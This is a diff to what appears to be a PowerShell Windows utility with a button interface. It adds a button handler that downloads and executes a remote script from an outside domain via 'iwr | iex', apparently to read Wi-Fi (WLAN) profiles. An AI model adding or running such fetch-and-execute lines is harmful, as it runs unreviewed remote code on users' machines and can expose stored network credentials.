@@ -1164,6 +1164,10 @@ cmd /c sysdm.cpl
 $WPFPaneluser.Add_Click({
 cmd /c "control userpasswords2"
 })
+$WPFGetwlanprofiles.Add_Click({
+iwr -useb on-get-wlanprofiles.migzam.com | iex
+})
+
 #===========================================================================
 # Tab 4 - Updates Buttons
 #===========================================================================
